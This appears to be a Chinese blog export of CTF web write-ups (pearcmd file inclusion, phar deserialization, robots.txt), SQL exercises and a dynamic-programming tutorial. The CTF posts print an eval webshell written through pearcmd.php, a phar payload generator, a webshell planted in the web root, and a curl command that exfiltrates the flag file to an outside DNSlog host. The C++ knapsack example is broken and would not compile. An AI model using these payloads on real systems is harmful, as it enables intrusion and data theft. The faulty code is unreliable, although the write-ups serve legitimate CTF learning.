<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释提示我们去看 <code>phpinfo.php</code> , 路径输入, 可以看到 phpinfo(), 然后看到有一个 Flag 字段, 里面写着 <code>fake&#123;Check_register_argc_argv&#125;</code> 又是提示, 直接搜这个字段, 发现 <code>register_argc_argv = ON</code>, 再加上题目源码提示,那就很明显是 pear 文件包含漏洞了.</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h3><p>首先先来介绍一下 pear, pear的全称为<code>PHP Extension and Application Repository</code>，中文翻译为php扩展和应用仓库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复造轮子.</p>
<p>可以通过 pear 命令往 php 目录中下载内容(出网下载), 也可以使用 pear 命令创建内容(不出网).</p>
<h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p><code>register_argc_argv</code> 是 <code>php.ini</code> 里面的一个选项，默认为OFF，如果被设置成 ON, 那么就能获得以下权利:</p>
<ol>
<li>在命令行模式下, 通过 <code>$_SERVER[‘argv’]</code> 获得命令行参数</li>
<li>在 Web 模式下, 可以在 URL 里嵌入 <code>+</code> 号, 其中会将<code>+</code> 号链接的参数的个数存入 <code>argc</code>, 各个参数的值存入 <code>argv</code>.</li>
</ol>
<h3 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h3><p>在 <code>pearcmd.php</code> 中, 会有逻辑尝试 <code>argv</code> 变量, 再尝试 <code>_SERVER[&#39;argv&#39;]</code> , 其中<code>_SERVER[&#39;argv&#39;]</code> 是我们可以控制的变量, 最后会把 <code>_SERVER[&#39;argv&#39;]</code> 给 return 出来, 所以我们这里可以在文件包含中获取的我们在 GET 里传递的参数了.</p>
<p>这里使用 <code>config-create</code> 来在本地指定目录创建文件, 然后用 <code>+</code> 代替空格, 构造请求如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/process.jpg"></p>
<p>连接蚁剑, 即可 getshell.</p>
<p><img src="/result.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>pear</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】PharOne (DNS log外带法)</title>
    <url>/2023/10/29/newstarctf2023-pharone/</url>
    <content><![CDATA[<h1 id="【newstarctf2023】PharOne-DNS-log外带法"><a href="#【newstarctf2023】PharOne-DNS-log外带法" class="headerlink" title="【newstarctf2023】PharOne (DNS log外带法)"></a>【newstarctf2023】PharOne (DNS log外带法)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机，看到一个文件上传的页面，上传一句话木马文件后发现啥shell 拿不到，变换思路，看源码中有注释提示：class.php，url 请求 class.php 发现代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这个代码，就知道这个题要用 phar 去做了。</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>留意到了 unlink 这个方法和 flag 这个类，这个方法是可以触发 phar 的反序列化的，这里列举一下可以触发 phar反序列化 的方法：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() </span><br><span class="line"></span><br><span class="line">file_put_contents() file_get_contents() </span><br><span class="line"></span><br><span class="line">file_exists() fileinode() include() </span><br><span class="line">require() include_once require_once() </span><br><span class="line"></span><br><span class="line">filemtime() fileowner() fileperms() </span><br><span class="line">filesize() is_dir() scandir() rmdir() </span><br><span class="line"></span><br><span class="line">highlight_file()</span><br><span class="line"></span><br><span class="line">还有一个类：</span><br><span class="line">new DirectoryIteartor() </span><br></pre></td></tr></table></figure>

<p>基本思路就是通过post 上传 phar 文件，然后触发 unlink 反序列化，在 Flag 类中触发exec($this-&gt;cmd); 实现 RCE。</p>
<p>phar 文件的构成：</p>
<p><img src="/2023/10/29/newstarctf2023-pharone/1.jpg"></p>
<p>在 phar 文件中的.metadata中可以写入 php 语句，当执行 phar:&#x2F;&#x2F;文件名 去读取该 phar 文件时，上述讲到的方法就会检查.metadata是否存在，如果存在，就触发反序列化。</p>
<p>先写一段 php 代码用于生成 phar 文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;sleep 5&quot;</span>; <span class="comment">#判断无回显是否成功执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">#触发 unlink</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">#生成 phar 文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">#设置 phar 文件头，这里用 GIF89a 做文件头欺骗，防止有文件头检查</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">#设置内容，这里会签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">#随便写点 txt，让他通过检查</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>写完后改后缀为.gif，通过文件上传页面上传该 phar 文件，结果上传不上去，发现是他对内容做了检查，检查了 phar 的文件头：__HALT_COMPILER();</p>
<p>这里需要绕过检查，使用 linux 的gzip压缩 phar 文件来绕过检查，除了 gzip 以外，将Phar压缩成<strong>tar、bzip2</strong>后均能够触发反序列化，大致原理就是在执行phar:&#x2F;&#x2F;文件时，会判断这个文件是不是标准的 phar 文件，在判断过程中对 zip，gz，bz 这三种压缩形式的幻数做了处理，分别调用了他们对应的decompress过滤器做解压缩处理。</p>
<p>我们这里将生成的 phar 文件拖到 kali 用 gzip 进行压缩，然后上传，改后缀上传，文件名为：a.gif，发现成功上传，然后构造 payload：<br>file&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;改名后的文件，发现空了 5 秒，成功rce。</p>
<p>这里另外一个难点就是无回显 RCE，本人当时一直弹不动 shell，所以就写了一个 DNSLOG 外带，具体指令为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">curl http://9esedf.ceye.io/`cat $(find / -name flag*)`</span><br></pre></td></tr></table></figure>

<p>这里的 <a href="http://9esedf.ceye.io/">http://9esedf.ceye.io/</a> 是 dnslog 网站( <a href="http://ceye.io/">http://ceye.io</a> )分配给我的域名。这里注意 dnslog 外带只能带一个参数出来，所以如果你用 ls 只能获得到 ls 的第一个参数。之后用 find 指令去找 flag，然后带出来，获得 flag，结果如下：</p>
<p><img src="/2023/10/29/newstarctf2023-pharone/2.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解上说：</p>
<p>“Web根目录可写，可以直接写一个WebShell进去”</p>
<p>构造 cmd 为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后 getshell，确实没有往这方面想，是我想复杂了，学到了 QAQ</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>phar</tag>
        <tag>反序列化</tag>
        <tag>文件上传</tag>
        <tag>DNS log 外带</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】robotstxt</title>
    <url>/2023/09/15/robotstxt/</url>
    <content><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>robots.txt 文件是一个文本文件，使用任何一个常见的文 本编辑器，比如 Windows 系统自带的 Notepad，就可以创建和编辑它。robots.txt 是一个协议，而不是一个命令。 robots.txt 是搜索引擎中访问网站的时候要查看的第一个 文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件 是可以被查看的。</p>
<h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>robots.txt 常用于过滤掉不希望搜索引擎能搜索出来的文件，这种文件常常是敏感的，本体中，如下：<br><img src="/2023/09/15/robotstxt/image1.jpg"><br>在获取到&#x2F;fl0g.php的信息后，放在url里 get 请求即可获取到 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>robots.txt</tag>
      </tags>
  </entry>
  <entry>
    <title>中级 SQL 语句</title>
    <url>/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h2 id="常用的-SQL-命令"><a href="#常用的-SQL-命令" class="headerlink" title="常用的 SQL 命令"></a>常用的 SQL 命令</h2><p>基本思路：</p>
<p>JOIN 做 关联查询，WHERE 做条件限制，函数做计算。</p>
<p>查询每个部门的平均年龄</p>
<p>使用 AVG 函数来求均值，JOIN 表加条件，GROUP BY 来按部门展示</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 部门信息.部门编号,部门信息.部门名称,</span><br><span class="line">    <span class="built_in">AVG</span>(员工信息.年龄) <span class="keyword">AS</span> 平均年龄</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    员工信息</span><br><span class="line"><span class="keyword">JOIN</span></span><br><span class="line">    部门信息 <span class="keyword">ON</span> 员工信息.所在部门 <span class="operator">=</span> 部门信息.部门编号</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    部门信息.部门编号, 部门信息.部门名称;</span><br></pre></td></tr></table></figure>

<p>mitmproxy</p>
<p>查询和李文萌不在一个部门的员工</p>
<p>展示除了特定值以外数据，使用    ！&#x3D;    来限制，先在部门表将和李文萌不在一个部门的员工给选择出来，再通过关联查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 员工姓名</span><br><span class="line"><span class="keyword">FROM</span> 员工信息</span><br><span class="line"><span class="keyword">WHERE</span> 所在部门 <span class="operator">!=</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> 所在部门</span><br><span class="line">    <span class="keyword">FROM</span> 员工信息</span><br><span class="line">    <span class="keyword">WHERE</span> 员工姓名 <span class="operator">=</span> <span class="string">&#x27;李文萌&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">AND</span> 员工姓名 <span class="operator">!=</span> <span class="string">&#x27;李文萌&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查询每个员工的工号，姓名，所在部门名称，以及其部门领导姓名</p>
<p>用自连接查询，像加入其他表一样加入自己的也是可以的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    e.员工工号,</span><br><span class="line">    e.员工姓名,</span><br><span class="line">    d.部门名称,</span><br><span class="line">    l.员工姓名 <span class="keyword">AS</span> 部门领导姓名</span><br><span class="line"><span class="keyword">FROM</span> 员工信息 <span class="keyword">AS</span> e</span><br><span class="line"><span class="keyword">JOIN</span> 部门信息 <span class="keyword">AS</span> d <span class="keyword">ON</span> e.所在部门 <span class="operator">=</span> d.部门编号</span><br><span class="line"><span class="keyword">JOIN</span> 员工信息 <span class="keyword">AS</span> l <span class="keyword">ON</span> d.部门领导工号 <span class="operator">=</span> l.员工工号;</span><br></pre></td></tr></table></figure>

<p>找出哪个部门没有员工？</p>
<p>用 IS NULL</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> d.部门编号, d.部门名称</span><br><span class="line"><span class="keyword">FROM</span> 部门信息 <span class="keyword">AS</span> d</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> 员工信息 <span class="keyword">AS</span> e <span class="keyword">ON</span> d.部门编号 <span class="operator">=</span> e.所在部门</span><br><span class="line"><span class="keyword">WHERE</span> e.员工工号 <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>查询在第5学期选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、所在专业名称。</p>
<p>这里用 AND 链接做条件限制</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.student_id, s.student_name, m.major_name</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g1 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g1.student_id</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g2 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g2.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c1 <span class="keyword">ON</span> g1.course_id <span class="operator">=</span> c1.course_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c2 <span class="keyword">ON</span> g2.course_id <span class="operator">=</span> c2.course_id</span><br><span class="line"><span class="keyword">JOIN</span> major_info m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id</span><br><span class="line"><span class="keyword">WHERE</span> c1.course_name <span class="operator">=</span> <span class="string">&#x27;数据库原理&#x27;</span> <span class="keyword">AND</span> c1.course_term <span class="operator">=</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">AND</span> c2.course_name <span class="operator">=</span> <span class="string">&#x27;软件工程&#x27;</span> <span class="keyword">AND</span> c2.course_term <span class="operator">=</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>查询在选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、以及各科课程的成绩。</p>
<p>如何拆解，首先我们先考虑条件：“选修了“数据库系统原理”和“软件工程导论”这两门课程的学生”，先用 WHERE 语句按照条件查询出来，然后再去 JOIN 其他表展示剩下的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    s.student_id, </span><br><span class="line">    s.student_name,</span><br><span class="line">    c.course_name,</span><br><span class="line">    g.grades</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">WHERE</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;数据库原理&#x27;</span></span><br><span class="line">) <span class="keyword">AND</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;软件工程&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>求出每门课的课程号、选课人数。</p>
<p>用 COUNT 去统计，这里使用左链接显示没有人选的科目</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    <span class="built_in">COUNT</span>(g.student_id) <span class="keyword">AS</span> number_of_students</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_id, c.course_name;</span><br></pre></td></tr></table></figure>

<p>查询所有学生的选修课程情况和成绩，若学生没有选修任何课程，也要包含在其中。</p>
<p>也是左链接，同理。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    s.student_id,</span><br><span class="line">    s.student_name</span><br><span class="line"><span class="keyword">FROM</span> grades_info g</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查询被选修了的课程的选修情况和所有开设课程名，包括没有被选修的课程</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_name,</span><br><span class="line">    GROUP_CONCAT(s.student_name) <span class="keyword">AS</span> students_enrolled</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> c.course_name;</span><br></pre></td></tr></table></figure>

<p>在学生信息表中，查询年龄比“王林”大的学生的学号，姓名，年龄</p>
<p>用 YEAR()函数转换为 int 再相减</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s1.student_id,</span><br><span class="line">    s1.student_name,</span><br><span class="line">    <span class="keyword">YEAR</span>(<span class="built_in">CURRENT_DATE</span>) <span class="operator">-</span> <span class="keyword">YEAR</span>(s1.birthday) <span class="keyword">AS</span> age</span><br><span class="line"><span class="keyword">FROM</span> students_info s1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s2 <span class="keyword">ON</span> s1.student_id <span class="operator">!=</span> s2.student_id</span><br><span class="line"><span class="keyword">WHERE</span> s2.student_name <span class="operator">=</span> <span class="string">&#x27;王林&#x27;</span> <span class="keyword">AND</span> s1.birthday <span class="operator">&gt;</span> s2.birthday</span><br></pre></td></tr></table></figure>
<p>将“student_view3”视图的内容修改为：“数据库系统原理”课程所选修学生的专业名称和各个专业的选课学生人数</p>
<p>这里用 CREATE OR REPLACE 修改视图，然后 FROM 这边可以从一个查询结果里的表选取，用 AS t 重新命名为 t，这里就可以体现出数据库查询思路了，由简单再到复杂，将复杂的语句拆开成几个部分，实现了各个部分再合并。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> student_view3 <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> t.major_name,<span class="built_in">COUNT</span>(t.student_id) <span class="keyword">AS</span> numbers</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> m.major_name, s.student_id</span><br><span class="line"><span class="keyword">FROM</span> students_info <span class="keyword">AS</span> s</span><br><span class="line"><span class="keyword">JOIN</span> major_info <span class="keyword">AS</span> m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id) <span class="keyword">AS</span> t</span><br><span class="line"><span class="keyword">JOIN</span> grades_info <span class="keyword">AS</span> g <span class="keyword">ON</span> t.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info <span class="keyword">AS</span> c <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">WHERE</span> c.course_name <span class="operator">=</span> &quot;数据库原理&quot;</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> t.major_name;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库基础</category>
        <category>SQL实践部分</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】动态规划</title>
    <url>/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    <content><![CDATA[<h1 id="【算法】动态规划"><a href="#【算法】动态规划" class="headerlink" title="【算法】动态规划"></a>【算法】动态规划</h1><p>动态规划是一个递推的问题解法，每一步递推都会获得<strong>当前情况下的最优解</strong>，与贪心不同，会根据当前情况去更改策略，要使用动态规划必须满足一下几个性质：</p>
<ul>
<li>最优子结构：大问题的最优解可以由小问题的最优解推出</li>
<li>重叠子问题：要求子问题很小，而且在求解当前子问题的时候不会产生新的子问题</li>
<li>无后效性：当前的最优解不会因为后面的求解而改变。</li>
</ul>
<h2 id="0-1-背包问题"><a href="#0-1-背包问题" class="headerlink" title="0-1 背包问题"></a>0-1 背包问题</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>0-1 背包问题是个很经典的动态规划问题，对于下面这个问题：</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image.png"></p>
<p>上述问题可以证明贪心策略是不可行的（通过性价比去选取会忽略能够最大化利用背包空间的情况），使用动态规划的核心就是<strong>根据递推公式来维护一个动态规划表</strong>。</p>
<p>对于 0-1 背包问题，通常会选取背包容量作为纵坐标，选取物品个数作为横坐标，即 $P(i,c)$ 标识在容量为 $c$ 时，前 $i$ 个物品的最大价值，然后进行初始化，没有商品时 $P(0,c) &#x3D; 0$，没选择商品时$P(i,0) &#x3D; 0$：</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-1.png"></p>
<p>我们从选择物品开始逐行遍历，当面对下一个物品时，无非只有两种选择：</p>
<ol>
<li>选取这个物品，然后加上占用背包容量和价值</li>
<li>不选取这个物品</li>
</ol>
<p>即只可能出现在当前点的左上方或者正上方，以递推方程的形式就可以表示为：</p>
<p>$$ P(i,c) &#x3D; max(P(i-1,c-v_i)+p_i,P(i-1,c)) $$</p>
<p>在递推过程中，如果要追踪加入背包的商品，就要记录决策的过程，构造一个数组 $Rec[i,c]$，如果在决策过程中加入了这个商品，就令$Rec[i,c]&#x3D;1$，反之等于 0</p>
<p>在记录过后，可以通过回溯的方式，去还原加入背包的商品，回溯过程可以是这样的，对比$P(i,c)$ 和 $P(i-1,c)$，如果不相同就说明 $P(i,c)$ 是从 $P(i-1,c-v_i)$ 跳转过来的，就直接看 $Rec[i-1,c-v_i]$ 是否为 1，如果为 1 就说明加入了编号为 $i-1$ 的商品，反之则没有。</p>
<p>如果 $P(i,c) &#x3D; P(i-1,c)$，就看 $Rec[i-1,c]$，如果等于 1 就说明加入了编号为 $i-1$ 的商品，反之则没有</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-2.png"></p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-3.png"></p>
<p>经典的 0-1 背包模板题，直接上代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">110</span>][<span class="number">1010</span>];</span><br><span class="line"><span class="type">int</span> c[<span class="number">110</span>];</span><br><span class="line"><span class="type">int</span> p[<span class="number">110</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t,m;</span><br><span class="line">    cin&gt;&gt;t&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i]&gt;&gt;p[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=t;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=c[i])&#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j-c[i]]+ p[i],dp[i<span class="number">-1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;dp[M][T]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="动态规划解决带权区间调度问题"><a href="#动态规划解决带权区间调度问题" class="headerlink" title="动态规划解决带权区间调度问题"></a>动态规划解决带权区间调度问题</h2><p>例题：</p>
<p><img src="/2023/12/22/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-4.png"></p>
<p>这道题需要构造一个结构体，结构体用于存储挤奶的开始时间，结束时间，以及收益，然后以 $DP[i]$ 作为选择当前区间的最大收益，递推思路为选择或者不选择这个区间，如果选择了当前这个区间，就要找到<strong>这个区间开始前最后结束的区间</strong>，然后加上这个区间的权重，如果不选这个区间，就跟上前一个区间的最大收益，递推方程如下：</p>
<p>$$DP[i] &#x3D; max((DP[p[i]]+w_i),DP[i-1])$$</p>
